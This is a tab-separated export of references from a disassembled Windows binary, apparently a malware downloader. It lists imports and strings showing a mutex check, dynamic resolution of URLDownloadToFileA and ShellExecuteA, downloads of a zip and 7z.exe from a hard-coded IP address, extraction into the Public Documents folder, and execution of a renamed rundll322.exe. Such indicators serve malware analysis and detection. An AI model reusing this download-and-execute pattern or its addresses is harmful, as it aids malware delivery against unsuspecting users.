reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x140001089	0x14000d530	string	0x140001070	SVP7dadsadsadsadsad
0x140001094	0x14000c000	import	0x140001070	KERNEL32.dll.CreateMutexA
0x14000109a	0x14000c008	import	0x140001070	KERNEL32.dll.GetLastError
0x1400010bb	0x14000d548	string	0x140001070	Shell32.dll
0x1400010d2	0x14000c010	import	0x140001070	KERNEL32.dll.LoadLibraryA
0x1400010d8	0x14000d558	string	0x140001070	urlmon.dll
0x1400010e2	0x14000c010	import	0x140001070	KERNEL32.dll.LoadLibraryA
0x1400010e8	0x14000d568	string	0x140001070	kernel32.dll
0x1400010f2	0x14000c010	import	0x140001070	KERNEL32.dll.LoadLibraryA
0x1400010f8	0x14000d578	string	0x140001070	ShellExecuteA
0x140001105	0x14000c018	import	0x140001070	KERNEL32.dll.GetProcAddress
0x14000110b	0x14000d588	string	0x140001070	URLDownloadToFileA
0x140001118	0x14000c018	import	0x140001070	KERNEL32.dll.GetProcAddress
0x14000111e	0x14000d5a0	string	0x140001070	VirtualAlloc
0x14000112b	0x14000c018	import	0x140001070	KERNEL32.dll.GetProcAddress
0x140001131	0x14000d5b0	string	0x140001070	CreateFileA
0x14000113b	0x14000c018	import	0x140001070	KERNEL32.dll.GetProcAddress
0x140001141	0x14000d5c0	string	0x140001070	ReadFile
0x14000114b	0x14000c018	import	0x140001070	KERNEL32.dll.GetProcAddress
0x140001151	0x14000d5d0	string	0x140001070	GetFileSize
0x14000115b	0x14000c018	import	0x140001070	KERNEL32.dll.GetProcAddress
0x140001161	0x14000d5e0	string	0x140001070	CloseHandle
0x14000116b	0x14000c018	import	0x140001070	KERNEL32.dll.GetProcAddress
0x140001171	0x14000d5f0	string	0x140001070	C:\Users\Public\Documents\svchost.txt
0x1400011ae	0x14000c020	import	0x140001070	KERNEL32.dll.GetModuleFileNameA
0x1400011fc	0x14000d618	string	0x140001070	http://23.224.36.160:280/%c.zip?=%d
0x140001220	0x14000d640	string	0x140001070	C:\Users\Public\Documents\1.zip
0x140001233	0x14000d660	string	0x140001070	C:\Users\Public\Documents\7z.exe
0x140001246	0x14000d660	string	0x140001070	C:\Users\Public\Documents\7z.exe
0x14000124d	0x14000d688	string	0x140001070	http://23.224.36.160:280/7z.exe
0x140001262	0x14000d640	string	0x140001070	C:\Users\Public\Documents\1.zip
0x14000127f	0x14000d6a8	string	0x140001070	x C:\Users\Public\Documents\1.zip -oC:\Users\Public\Documents
0x140001286	0x14000d660	string	0x140001070	C:\Users\Public\Documents\7z.exe
0x14000128d	0x14000d6e8	string	0x140001070	open
0x1400012a6	0x14000c028	import	0x140001070	KERNEL32.dll.Sleep
0x1400012ac	0x14000d6f0	string	0x140001070	C:\Users\Public\Documents\987.txt,msg -a
0x1400012b3	0x14000d720	string	0x140001070	C:\Users\Public\Documents\rundll322.exe
0x1400012ba	0x14000d6e8	string	0x140001070	open
0x1400012d2	0x14000d748	string	0x140001070	C:\Users\Public\Documents\1.lnk
